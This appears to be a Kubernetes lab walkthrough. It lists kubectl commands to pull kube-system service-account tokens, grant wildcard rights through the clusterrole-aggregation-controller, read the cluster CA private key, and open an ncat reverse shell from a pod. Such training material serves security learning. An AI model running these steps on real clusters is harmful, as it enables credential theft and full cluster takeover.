# SSH to Get Secrets
This scenario begins with ssh access to a pod. The ssh credentials can be found in the scenario setup.

There are a couple of ways you can approach this one. First up (for either approach) we get secrets
1. `kubectl get po -n kube-system` will fail (user doesn't have those rights)
2. `kubectl get secrets -n kube-system` will work and give you a list of available secrets

Now the question is, which secret to use. The first option might be the clusterrole-aggregation-controller, which needs steps that look like this.

3. This will give you the clusterrole-aggregation-controller token `kubectl -n kube-system get secret clusterrole-aggregation-controller-token-[RAND] -o json`
4. base64 decode the token field
5. Use the token as part of a kubectl command  `kubectl --as test --as=group=system:masters --token="[TOKEN]" get clusterroles` to confirm it's working
6. Edit the service account for the token you're using (weird but this particular service account token has the "escalate" permission which lets you do this) `kubectl edit clusterrole system:controller:clusterrole-aggregation-controller`

Add the following lines in the "rules" section

```yaml
- apiGroups:
  - '*'
  resources:
  - '*'
  verbs:
  - '*'
```

7. Now you're a `cluster-admin` :)
8. get the API server pod name `kubectl --token="[TOKEN]" -n kube-system get pods`
9. get the key `kubectl --token="[TOKEN]" -n kube-system exec [API_SERVER_POD] cat /etc/kubernetes/pki/ca.key`

Here's another way of doing it, as some service accounts have got `create pods`

3. This will give you the replicaset-controller token `kubectl -n kube-system get secret system:controller:replicaset-controller-[RAND] -o json`
4. base64 deocde the token field
5. Start a new shell and exec into the client machine, then start an ncat listener on the client machine `ncat -l -p 8989`
6. run the pod `ncat-reverse-shell-pod.yml` on the target host, remembering to modify the target IP address to that of the client machine.
7. This should create a shell for you to access which has the pki directory mounted in `/pki`
